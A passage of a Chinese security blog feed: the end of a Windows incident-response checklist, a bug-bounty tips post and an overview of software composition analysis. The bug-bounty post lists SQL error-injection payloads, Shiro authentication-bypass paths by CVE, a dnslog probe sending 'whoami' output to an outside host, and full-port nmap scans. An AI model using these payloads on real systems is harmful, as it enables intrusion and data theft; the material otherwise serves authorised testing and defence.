src="http://wiki.tidesec.com/uploads/202205/assets/1614151148529-9ee08aec-d46d-472f-aec4-dd81d7e2d2d2.png" alt="图片.png"></p><h4 id="二、检查异常端口进程"><a href="#二、检查异常端口进程" class="headerlink" title="二、检查异常端口进程"></a>二、检查异常端口进程</h4><p>查看目前连接：<br>netstat -ano<br>一般是查看已经成功建立的连接：<br>netstat -ano | findstr “ESTABLISHED”</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151154486-d2b7cc92-5d50-40c1-b779-e52d73fcf37e.png" alt="图片.png"> 根据pid定位程序名称<br>tasklist | findstr  ”pid”</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151160698-2b29eb28-acf5-49f6-9cf6-f2f1a15609c3.png" alt="图片.png"> 运行中输入msinfo32，可打开系统信息，在“正在运行任务”中可获取进程详细信息，包括进程的开始时间、版本、大小等信息。</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151168421-8d5d46e9-897d-4937-a96b-0128219bad87.png" alt="图片.png"> 根据端口查看pid<br>netstat -ano | findstr “8080”</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151173731-b0439fca-c231-4610-9bfb-b167996e60e6.png" alt="图片.png"> 利用wmic查看进程执行时的命令<br>Wmic process where name&#x3D;‘irefox.exe’ get name,Caption,executablepath,CommandLine ,processid,ParentProcessId &#x2F;value</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151178839-5b3c21c3-3942-4e8a-9d4c-573bd971d047.png" alt="图片.png"> Wmic process where processid&#x3D;‘2040’ get name,Caption,executablepath,CommandLine ,processid,ParentProcessId &#x2F;value</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151184688-1817257f-680f-442c-82b3-234bb196cd08.png" alt="图片.png"></p><h4 id="三、启动项检查"><a href="#三、启动项检查" class="headerlink" title="三、启动项检查"></a>三、启动项检查</h4><p>msconfig查看系统启动项</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151189572-292e5240-8ab6-4760-971e-b14ddb2a7ea7.png" alt="图片.png"> 查看注册表是否有异常启动项<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run<br>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151197255-8c7b6493-028c-4fd9-83c1-ec7052c21a02.png" alt="图片.png"></p><h4 id="四、查看系统定时任务"><a href="#四、查看系统定时任务" class="headerlink" title="四、查看系统定时任务"></a>四、查看系统定时任务</h4><p>Cmd下运行schtasks（win7系统利用at），查看定时任务</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151202366-0eca4680-153d-402a-9e23-dbdb0681d360.png" alt="图片.png"> C:\Windows\System32\Tasks 查看任务清单</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151210300-cfabef98-6e5c-40b0-b4a7-171487b8dd5b.png" alt="图片.png"> 删除任务计划<br>建议删除任务计划时以管理员登录<br>SchTasks &#x2F;Delete &#x2F;TN 任务计划名称</p><h4 id="五、查看系统服务"><a href="#五、查看系统服务" class="headerlink" title="五、查看系统服务"></a>五、查看系统服务</h4><p>Services.msc<br> <img src="http://wiki.tidesec.com/uploads/202205/assets/1614151219079-f0d2170a-2772-463d-a273-a7f2e55618fa.png" alt="图片.png"></p><p>删除服务可从任务管理器中手动删除，也可使用命令：<br>sc stop [服务名称]停止服务后，<br>sc delete [服务名称]删除服务</p><h4 id="六、文件查看"><a href="#六、文件查看" class="headerlink" title="六、文件查看"></a>六、文件查看</h4><p>查看最近打开的文件，运行窗口中输入“%UserProfile%\Recent”</p><p><img src="http://wiki.tidesec.com/uploads/202205/assets/1614151225460-c7b4bd07-aa25-49f8-a37f-ac960bad6dbe.png" alt="图片.png"> </p><p>查看C:\Documents and Settings，C:\Users下是否存在可疑用户或文件</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://github.com/Bypass007/Emergency-Response-Notes">应急响应实战笔记，一个安全工程师的自我修养</a><br>[应急响应实战笔记](</p>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94&quot;&gt;应急响应&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E6%A</summary>
      
    
    
    
    
    <category term="应急响应" scheme="https://yinwc.github.io/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
    
  </entry>
  
  <entry>
    <title>SRC挖洞经验总结</title>
    <link href="https://yinwc.github.io/2022/05/21/SRC%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    <id>https://yinwc.github.io/2022/05/21/SRC%E6%8C%96%E6%B4%9E%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</id>
    <published>2022-05-21T05:44:46.000Z</published>
    <updated>2023-04-23T09:18:58.135Z</updated>
    
    <content type="html"><![CDATA[<!-- TOC --><ul><li><a href="#%E6%80%BB%E7%BB%93">总结</a></li><li><a href="#%E5%B7%A5%E5%85%B7">工具</a><ul><li><a href="#%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86">资产收集</a></li><li><a href="#%E7%B3%BB%E7%BB%9F%E6%8C%87%E7%BA%B9%E6%8E%A2%E6%B5%8B">系统指纹探测</a></li><li><a href="#%E6%A1%86%E6%9E%B6%E5%9E%8B%E7%AB%99%E7%82%B9%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">框架型站点漏洞测试</a></li><li><a href="#%E9%9D%9E%E6%A1%86%E6%9E%B6%E5%9E%8B%E7%AB%99%E7%82%B9%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">非框架型站点漏洞测试</a></li><li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">端口扫描</a></li><li><a href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F">目录扫描</a></li></ul></li><li><a href="#%E6%8C%96%E6%B4%9E%E6%8A%80%E5%B7%A7">挖洞技巧</a><ul><li><a href="#js%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">js信息收集</a></li><li><a href="#shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87">Shiro权限绕过</a></li><li><a href="#dnslog%E4%BD%BF%E7%94%A8">dnslog使用</a></li><li><a href="#%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E">逻辑漏洞</a></li><li><a href="#%E6%A1%86%E6%9E%B6%E5%9E%8B%E7%AB%99%E7%82%B9%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">框架型站点漏洞测试</a></li><li><a href="#%E9%9D%9E%E6%A1%86%E6%9E%B6%E5%9E%8B%E7%AB%99%E7%82%B9%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95">非框架型站点漏洞测试</a></li><li><a href="#%E5%B0%8F%E7%A8%8B%E5%BA%8Fapp">小程序、APP</a></li></ul></li><li><a href="#reference">Reference</a></li></ul><!-- /TOC --><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><p>在交高危漏洞时，录屏之后再提交，以防SRC耍赖，修完后，直接忽略，无法出示证据。</p></li><li><p>手工测试技巧：</p><ul><li><p>真403、404（不可视）：由于服务器配置导致无法访问到内网，只有host碰撞一种破局方法</p></li><li><p>假403、404（不可视 or 可视）：只是没有访问到对应文件，目录扫描如果扫到了还是有机会出可视界面的，扫到可视界面就用可视界面的方法来测，没有的话也只能测接口了</p></li><li><p>后台登陆页面（可视）：目录扫描出后台功能、分析JS出后台接口、越权登录、逻辑问题、登录前端校验（改返回包）、有密码找回功能则分析密码重置相关漏洞、涉及各种手机邮箱验证码的功能是否有问题（可爆破、无时效性、万能验证码、返回至前端等）、图形验证码是否有效（能否绕过）、有用户注册功能则分析用户可注册（用户注册功能）、登录框注入、框架和cms本身就有0day、密码爆破、密码喷洒（推荐先搞，就算不成功也能发现存活用户）都是破局点。核心思路是能进后台（上述给出的这些手法主要都是进后台的）或者是能调用后台功能点（JS分析接口即可）。总之就是多看请求包和返回包，来针对性测各种逻辑和越权问题。</p></li><li><p>有大量功能点的页面（可视）：在以上三种情况的方法都适用的基础上，因为有大量不同的功能点，所以要多注意看http history来分析接口测试。核心思路百无禁忌，想测啥都行。主要是注意从功能点的角度去找漏洞。</p></li><li><p>把那种可视的站点测完了之后，再来考虑测这些403、404的站点。</p></li></ul></li><li><p>在开始挖洞的前期，可以先尝试找一些低危漏洞，我首推短信轰炸、邮箱轰炸、swagger-ui泄露、反射型XSS此类，主要是建立开局的信心！不要一上来就抱有太高的期望，否则容易打击自信，先从简单的慢慢来！</p></li><li><p>资产探测</p><ul><li>找到资产怎么办？首先对付这种情况最好使的方法就是换一种测绘引擎。比方说你一开始搜集用的是fofa，测完之后你可以再用hunter、quake、0zone等引擎继续去搜集资产，每家引擎用的搜集算法不同，结果也会有不同，这点不仅是SRC挖掘，渗透测试和红队打点也要注意这个，当搜集到的资产不足的时候，可以综合多个引擎来搜集资产。</li></ul></li></ol><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="资产收集"><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h3><ul><li>资产侦察灯塔系统：<a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a></li><li>fofa、hunter、quake、0zone、Oneforall（<a href="https://github.com/shmilylty/OneForAll%EF%BC%89">https://github.com/shmilylty/OneForAll）</a></li><li>子域名的工具还有layer子域名挖掘机、Sublist3r、证书透明度、在线工具等<ul><li>获取子域，然后从中筛选边缘资产、安全防护低资产。</li></ul></li></ul><h3 id="系统指纹探测"><a href="#系统指纹探测" class="headerlink" title="系统指纹探测"></a>系统指纹探测</h3><ol><li>目标：将收集到到域名全部进行一遍指纹探测，从中找出一些明显使用CMS、OA系统、shiro、Fastjson等的站点。</li><li>工具：<ul><li><strong>1、Ehole</strong>：<a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></li><li><strong>2、Glass</strong>：<a href="https://github.com/s7ckTeam/Glass">https://github.com/s7ckTeam/Glass</a></li></ul></li></ol><h3 id="框架型站点漏洞测试"><a href="#框架型站点漏洞测试" class="headerlink" title="框架型站点漏洞测试"></a>框架型站点漏洞测试</h3><p>   前面经过了子域名收集以及对收集到的子域名进行了指纹信息识别之后，那么对于框架型的站点，可以优先进行测试。</p><p>   类似用友NC、通达OA、蓝凌OA等，可以通过尝试现有的Nday漏洞进行攻击。通过搜索引擎、微信等渠道搜索漏洞利用方式，进行漏洞使用。</p><h3 id="非框架型站点漏洞测试"><a href="#非框架型站点漏洞测试" class="headerlink" title="非框架型站点漏洞测试"></a>非框架型站点漏洞测试</h3><ul><li>常见的登录逻辑漏洞总结：<a href="https://blog.csdn.net/qq_63217130/article/details/130187929">https://blog.csdn.net/qq_63217130/article/details/130187929</a></li></ul><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><ul><li><p>前面就是正常的渗透了，那么一个域名只是在80、443端口才有web服务吗？不可否认有些时候真的是，但是绝大多数情况下，类似8080、8443、8081、8089、7001等端口，往往会有惊喜。</p></li><li><p>常用工具nmap</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v  examples.com</span><br><span class="line">sudo nmap -sS -Pn -n --open --min-hostgroup 4 --min-parallelism 1024 --host-timeout 30 -T4 -v -p 1-65535 examples.com</span><br></pre></td></tr></table></figure></li></ul><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><ul><li>dirserach、御剑等</li><li><strong>dirsearch</strong>：<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a><ul><li><p>具体使用方法可以查看github介绍，这里我一般是使用如下命令（因为担心线程太高所以通过-t参数设置为2）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u www.xxx.com -e * -t 2</span><br></pre></td></tr></table></figure></li><li><p>支持自定义路径：</p><ul><li>路径：&#x2F;dirsearch-0.4.2&#x2F;db&#x2F;dicc.txt</li><li>可以增加springboot未授权的一些路径、swagger的路径以及一些例如vmvare-vcenter的漏洞路径。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">/nacos/</span><br><span class="line">/nacos</span><br><span class="line">?wsdl</span><br><span class="line">/swagger</span><br><span class="line">/api/swagger</span><br><span class="line">/swagger/ui</span><br><span class="line">/api/swagger/ui</span><br><span class="line">/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/user/swagger-ui.html</span><br><span class="line">/libs/swaggerui</span><br><span class="line">/api/swaggerui</span><br><span class="line">/swagger-resources/configuration/ui</span><br><span class="line">/swagger-resources/configuration/security</span><br><span class="line">/api-docs</span><br><span class="line">/v2/api-docs</span><br><span class="line">/swagger-ui.html</span><br><span class="line">/api.html</span><br><span class="line">/sw/swagger-ui.html</span><br><span class="line">/api/swagger-ui.html</span><br><span class="line">/template/swagger-ui.html</span><br><span class="line">/spring-security-rest/api/swagger-ui.html</span><br><span class="line">/spring-security-oauth-resource/swagger-ui.html</span><br><span class="line">/mappings</span><br><span class="line">/actuator/mappings</span><br><span class="line">/metrics</span><br><span class="line">/actuator/metrics</span><br><span class="line">/beans</span><br><span class="line">/actuator/beans</span><br><span class="line">/configprops</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><h2 id="挖洞技巧"><a href="#挖洞技巧" class="headerlink" title="挖洞技巧"></a>挖洞技巧</h2><h3 id="SQL注入技巧"><a href="#SQL注入技巧" class="headerlink" title="SQL注入技巧"></a>SQL注入技巧</h3><ol><li><p>如果你只有一次试验的机会，如何判定一个数据输入点是否存在SQL注入？<br>答案是使用时间盲注，如sleep(4)，如果真的存在注入，则肯定会延时4秒再显示结果。其他类型的注入都非一次试验而能确定存在的，并且一个数据输入点只要存在注入，必定存在时间盲注。</p></li><li><p>报错注入常用指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=2’ and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+</span><br><span class="line">?id=2’ and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+</span><br><span class="line">?id=1’ and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+</span><br></pre></td></tr></table></figure></li></ol><h3 id="js信息收集"><a href="#js信息收集" class="headerlink" title="js信息收集"></a>js信息收集</h3><p>  在一个站点扫描了目录、尝试登录失败并且没有自己注册功能的情况下，还可以从JS文件入手，获取一些URL，也许某个URL便能够未授权访问获取敏感信息呢。</p><ul><li>js都下载下来，写正则拼接</li><li>自动化工具：<ul><li>FindSomething：<a href="https://github.com/momosecurity/FindSomething">https://github.com/momosecurity/FindSomething</a></li><li>JSFinder：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></li><li>批量爬虫扫描JS文件中接口的脚本：<a href="https://github.com/Carrypan2023/leakinfo_finder">https://github.com/Carrypan2023/leakinfo_finder</a></li></ul></li></ul><h3 id="Shiro权限绕过"><a href="#Shiro权限绕过" class="headerlink" title="Shiro权限绕过"></a>Shiro权限绕过</h3><ul><li>CVE-2016-6802 <ul><li>在访问路径前加上&#x2F;任意目录名&#x2F;..&#x2F;，即可绕过访问</li></ul></li><li>CVE-2020-1957 <ul><li>&#x2F;demo&#x2F;..;&#x2F;admin&#x2F;index,其中demo为授权路径，admin&#x2F;index为鉴权路径 &#x2F;.;&#x2F;hello&#x2F;aaaa</li></ul></li><li>CVE-2020-11989<ul><li>admin&#x2F;page%252fABCDEFG其中admin&#x2F;page为鉴权路径，ABCDEFG为随意字符串 &#x2F;hello&#x2F;a%25%32%66a &#x2F;;&#x2F;test&#x2F;hello&#x2F;aaa</li></ul></li><li>CVE-2020-13933<ul><li>admin&#x2F;%3BABCDEFG，其中admin为鉴权路径，ABCDEFG为随意字符串</li></ul></li><li>CVE-2020-17510<ul><li>admin&#x2F;%2e</li></ul></li><li>CVE-2020-17523<ul><li>admin&#x2F;%20，其中admin为鉴权路径</li></ul></li><li>CVE-2022-32532<ul><li>特定条件下的漏洞利用：当shiro使用了RegExPatternMatcher进行路由匹配时，由于Java的正则Pattern.matches解析.默认是不匹配r或者n的，因此当path中带有%0a时可绕过正则匹配 &#x2F;permit&#x2F;a%0any</li></ul></li></ul><h3 id="dnslog使用"><a href="#dnslog使用" class="headerlink" title="dnslog使用"></a>dnslog使用</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`whoami`.xxxx.dnslog.cn</span><br></pre></td></tr></table></figure><h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><p>  <a href="https://yinwc.github.io/2020/05/12/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%91%E8%A7%81/">逻辑漏洞之我见</a></p><h3 id="框架型站点漏洞测试-1"><a href="#框架型站点漏洞测试-1" class="headerlink" title="框架型站点漏洞测试"></a>框架型站点漏洞测试</h3><p>​       前面经过了子域名收集以及对收集到的子域名进行了指纹信息识别之后，那么对于框架型的站点，可以优先进行测试。</p><p>​       类似用友NC、通达OA、蓝凌OA等，可以通过尝试现有的Nday漏洞进行攻击。通过搜索引擎、微信等渠道搜索漏洞利用方式，进行漏洞使用。</p><h3 id="非框架型站点漏洞测试-1"><a href="#非框架型站点漏洞测试-1" class="headerlink" title="非框架型站点漏洞测试"></a>非框架型站点漏洞测试</h3><p>常见的登录逻辑漏洞总结：<a href="https://blog.csdn.net/qq_63217130/article/details/130187929">https://blog.csdn.net/qq_63217130/article/details/130187929</a></p><h3 id="小程序、APP"><a href="#小程序、APP" class="headerlink" title="小程序、APP"></a>小程序、APP</h3><p>web端没有思路的时候，可以结合小程序、APP来进行渗透。小程序或APP的服务端其实可以在一定程度上与web应用的服务端相联系。</p><p>也就是说， 在小程序或者APP上，一样能够挖掘web端的漏洞，如SQL注入、XSS等，并且相对来说，这类等服务端安全措施会相对没有那么完备，所以在web端确实没有思路的时候，可以迂回渗透，从小程序、APP中进行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 小程序抓包、APP抓包参考链接：</span><br><span class="line">https://mp.weixin.qq.com/s/xuoVxBsN-t5KcwuyGpR56ghttps://mp.weixin.qq.com/s/45YF4tBaR-TUsHyF5RvEswhttps://mp.weixin.qq.com/s/M5xu_-_6fgp8q0KjpzvjLghttps://mp.weixin.qq.com/s/Mfkbxtrxv5AvY-n_bMU7ig</span><br></pre></td></tr></table></figure><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li>SRC漏洞挖掘之JS文件中的秘密：<a href="https://mp.weixin.qq.com/s/qBieDbVo9WjIkhqZJfMr3Q">https://mp.weixin.qq.com/s/qBieDbVo9WjIkhqZJfMr3Q</a></li><li>2022年我的SRC挖掘历程总结：<a href="https://mp.weixin.qq.com/s/ZDVo1hiLt7QnTiOa9Epno">https://mp.weixin.qq.com/s/ZDVo1hiLt7QnTiOa9Epno</a></li><li>SRC漏洞挖掘信息收集思路分享：<a href="https://xz.aliyun.com/t/10418#toc-10">https://xz.aliyun.com/t/10418#toc-10</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;!-- TOC --&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E6%80%BB%E7%BB%93&quot;&gt;总结&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%B7%A5%E5%85%B7&quot;&gt;工具&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%B5%84%E4%BA%</summary>
      
    
    
    
    
    <category term="SRC" scheme="https://yinwc.github.io/tags/SRC/"/>
    
  </entry>
  
  <entry>
    <title>SCA——软件成分分析</title>
    <link href="https://yinwc.github.io/2022/02/26/SCA/"/>
    <id>https://yinwc.github.io/2022/02/26/SCA/</id>
    <published>2022-02-26T07:47:33.000Z</published>
    <updated>2023-06-26T08:03:58.369Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1、SCA简介"><a href="#1、SCA简介" class="headerlink" title="1、SCA简介"></a>1、SCA简介</h3><p>​SCA，Software Composition Analysis，软件成本分析是一种对二进制软件的组成部分进行识别、分析和追踪的技术。</p><p>​SCA定义：<strong>软件成分分析产品通常在开发过程中对应用程序进行分析，以检测开源软件组件是否带有已知的漏洞，例如具有可用安全补丁程序的过期库，以及需要相应授权许可（法律风险）的商业软件或第三方产品。</strong>对其的说明是：提供了远程评估和验证配置的功能，例如Windows域组策略中的密码复杂性；经常用于实现法规遵从性，例如PCI或内部安全策略合规性。</p><p>​SCA致力于确保企业软件供应链的安全，从而支撑安全的应用程序开发和组装。</p><h3 id="2、SCA解决的问题"><a href="#2、SCA解决的问题" class="headerlink" title="2、SCA解决的问题"></a>2、SCA解决的问题</h3><ul><li><strong>应用第三方组件中的已知漏洞。</strong> <ul><li>第三方组件中本身存在的漏洞，攻击者可以利用这些已知的漏洞，对应用系统进行攻击破坏。</li></ul></li><li><strong>第三方组件的软件许可问题。</strong> <ul><li>这方面主要是分析调用的第三方组件的许可证类型。目前，国际公认的开源许可证共有80多种。有的许可证对软件的使用方式几乎没有限制，用户几乎不用关心需要承担的责任，但是也存在一些限制性比较强的许可证，如果不小心调用，可能会带来较大的法律风险和知识产权的损失。</li></ul></li><li><strong>第三方组件中的恶意代码问题。</strong> <ul><li>这方面的问题不算普遍，但是危害也比较大。风险的来源主要是在非正规渠道获取被篡改的第三方组件，或使用了恶意开发者提供的第三方组件，未经确认就引入开发的业务系统中会带来极大风险。</li></ul></li><li><strong>引用版本过旧的第三方组件。</strong><ul><li>版本过旧从表面来看，跟安全好像关系不大，但是仔细想想，比较老旧的第三方组件有可能会存在一些未知的、开发者没有公布的、且已修复的0day，所以这方面可以当作是不重要不紧急的风险来对待。</li></ul></li></ul><h3 id="3、SCA工具"><a href="#3、SCA工具" class="headerlink" title="3、SCA工具"></a>3、SCA工具</h3><h4 id="3-1-开源SCA工具"><a href="#3-1-开源SCA工具" class="headerlink" title="3.1 开源SCA工具"></a>3.1 开源SCA工具</h4><p>OWASP的Dependency-Check</p><p>Dependency-Track</p><h4 id="3-2-商业SCA工具"><a href="#3-2-商业SCA工具" class="headerlink" title="3.2 商业SCA工具"></a>3.2 商业SCA工具</h4><p>Checkmarx</p><p>CxSCA</p><h3 id="4、SCA的应用场景"><a href="#4、SCA的应用场景" class="headerlink" title="4、SCA的应用场景"></a>4、SCA的应用场景</h3><h4 id="4-1-传统场景下的应用"><a href="#4-1-传统场景下的应用" class="headerlink" title="4.1 传统场景下的应用"></a>4.1 传统场景下的应用</h4><h5 id="1-1-合规中SCA"><a href="#1-1-合规中SCA" class="headerlink" title="1.1 合规中SCA"></a>1.1 合规中SCA</h5><p>​等保1.0和等保2.0中涉及到SCA的部分要求对比如下：</p><p><img src="/2022/02/26/SCA/1.png" alt="SCA"></p><h5 id="1-2-脆弱管理中的SCA"><a href="#1-2-脆弱管理中的SCA" class="headerlink" title="1.2 脆弱管理中的SCA"></a>1.2 脆弱管理中的SCA</h5><p>​安全配置核查，也就是我们的SCA，主要的检查范围是由人为疏忽造成的配置问题，主要包括了账号、口令、授权、日志、IP通信等方面内容。安全配置与系统的相关性非常大，同一个配置项在不同业务环境中的安全配置要求是不一样的，如在WEB系统边界防火墙中需要开启HTTP通信，但一个WAP网关边界就没有这样的需求，因此在设计系统安全基线的时候，安全配置是一个关注的重点。</p><p>​系统脆弱性由安全基线来评估，系统实现层中的安全基线要求主要是由安全漏洞方面、安全配置方面等检查项构成，这些检查项的覆盖面、有效性成为了基线安全实现的关键,如下图所示：</p><p><img src="/2022/02/26/SCA/2.png" alt="SCA"></p><h4 id="4-2-新技术中的应用"><a href="#4-2-新技术中的应用" class="headerlink" title="4.2 新技术中的应用"></a>4.2 新技术中的应用</h4><h5 id="4-2-1-物联网（IOT）中的SCA"><a href="#4-2-1-物联网（IOT）中的SCA" class="headerlink" title="4.2.1 物联网（IOT）中的SCA"></a>4.2.1 物联网（IOT）中的SCA</h5><p>​通过对物联网中的一些设备，比如摄像头，智能恒温器等的信息采集，可直接或间接地暴露用户的隐私信息。如果生产商缺乏安全意识，很多设备缺乏加密、认证、访问控制管理的安全措施，物联网中的数据就会很容易被窃取或非法访问，造成数据泄露。这种新型的信息网络往往会遭受有组织的 APT 攻击。</p><p>​物联网不同层次可能有着相同的安全需求，下表对物联网可能涉及到的SCA相关问题的威胁和对策做了总结：</p><p><img src="/2022/02/26/SCA/3.png" alt="SCA"></p><h5 id="4-2-2-工控中的SCA"><a href="#4-2-2-工控中的SCA" class="headerlink" title="4.2.2 工控中的SCA"></a>4.2.2 工控中的SCA</h5><p>​根据工业网络安全合规标准和国内外的最佳实践，通过常态化的工业网络安全评估，查找突出问题和薄弱环境，排查安全隐患和安全漏洞，分析安全状况和防护水平，有针对性地采取管理和技术防护措施，是提升工业企业网络安全保障能力，切实保障网络安全的有效途径。在监管机构的安全检查和工业企业自查过程中，复杂多样的工业环境和数量巨大的评估对象都对评估人员的技术水平和工作量提出了很大的考验。SCA在其中发挥的作用如下：</p><p><img src="/2022/02/26/SCA/3.png" alt="SCA"></p><h5 id="4-2-3-容器中SCA"><a href="#4-2-3-容器中SCA" class="headerlink" title="4.2.3 容器中SCA"></a>4.2.3 容器中SCA</h5><p>​   Kubernetes（k8s）是自动化容器操作的开源平台，这些操作包括部署，调度和节点集群间扩展。Kubernetes加快了容器部署，还让用户能够管理大规模的多容器集群。它便于持续集成和持续交付，处理网络、服务发现和存储，还能够在多云环境中执行所有这些任务。Kubernetes中涉及到的配置问题及对策如下表：</p><p><img src="/2022/02/26/SCA/4.png" alt="SCA"></p><p>​除了认真遵循Kubernetes安全文档外，确保Kubernetes安装部署的最佳方法是，尽早将安全纳入到部署的环境中，通过正确配置主动保护环境比数据泄密发生后试图应对要简单得多，也省钱得多。另外，通过积极主动的监控来充分利用高级的安全运维（SecOps）实践，提供了保护日益Serverless的环境所需要的那种可见性。</p><h5 id="4-2-4-云环境中的SCA"><a href="#4-2-4-云环境中的SCA" class="headerlink" title="4.2.4 云环境中的SCA"></a>4.2.4 云环境中的SCA</h5><p>​Dome9安全公司首席执行官Zohar Alon表示：“配置错误导致了目前云中的大部分数据被盗和泄露事件。”</p><p>提供云服务的方式多样化也导致这个问题更加严重。开发人员创建了虚拟服务器和容器，以便快速推出应用程序，存储数据。业务部门通过自己注册来使用服务，个人用户也是如此。但本地数据中心所采用的传统配置管理方法并不适用于云服务。云平台通常有自己的系统来监视配置的更改。例如，AWS有AWS Cloud Trail和AWS Config。微软的Azure云平台有其运营管理套件。其他流行的SaaS云提供商没有集中的管理工具，而是让个人用户负责自己的安全和共享设置。</p><p>​云计算系统的配置核查对象如下表所示：</p><p><img src="/2022/02/26/SCA/5.png" alt="SCA"></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.aqniu.com/tools-tech/38955.html">https://www.aqniu.com/tools-tech/38955.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1、SCA简介&quot;&gt;&lt;a href=&quot;#1、SCA简介&quot; class=&quot;headerlink&quot; title=&quot;1、SCA简介&quot;&gt;&lt;/a&gt;1、SCA简介&lt;/h3&gt;&lt;p&gt;​		SCA，Software Composition Analysis，软件成本分析是一种对二进制</summary>
      
    
    
    
    
    <category term="SCA" scheme="https://yinwc.github.io/tags/SCA/"/>
    
  </entry>
  
  <entry>
    <title>shiro 权限绕过系列汇总</title>
    <link href="https://yinwc.github.io/2022/01/13/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%B3%BB%E5%88%97%E6%B1%87%E6%80%BB/"/>
    <id>https://yinwc.github.io/2022/01/13/shiro-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E7%B3%BB%E5%88%97%E6%B1%87%E6%80%BB/</id>
    <published>2022-01-13T07:18:58.000Z</published>
    <updated>2023-04-21T06:33:44.714Z</updated>
    
